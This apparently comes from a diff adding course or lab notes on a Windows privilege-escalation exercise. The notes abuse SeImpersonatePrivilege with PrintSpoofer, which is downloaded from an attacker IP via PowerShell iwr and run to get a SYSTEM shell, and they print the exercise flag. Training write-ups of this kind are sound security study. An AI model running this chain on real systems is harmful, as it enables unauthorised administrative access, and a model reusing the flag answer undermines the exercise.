@@ -1,0 +1,23 @@
+Questions 1
+Follow the steps from this section on CLIENTWK220 (VM #1). Use PrintSpoofer to obtain code execution, an interactive shell, or access to the GUI as administrative user and find the flag on the desktop of daveadmin.
+
+nc 192.168.207.220 4444 
+
+C:\Users\dave> whoami /priv
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+# Above shows that dave has the privilege SeImpersonatePrivilege assigned. Therefore, we can attempt to elevate our privileges by using PrintSpoofer.
+
+# Prepare the exploit tools
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+# Upload the exploit tools
+C:\Users\dave> powershell
+PS C:\Users\dave> iwr -uri http://192.168.45.223/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+
+PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
+
+PS C:\Windows\system32> whoami
+nt authority\system
+
+PS C:\Users\daveadmin\Desktop> type flag.txt
+OS{d74b27eb10d31cd485a9bfd0c15a2b9a}
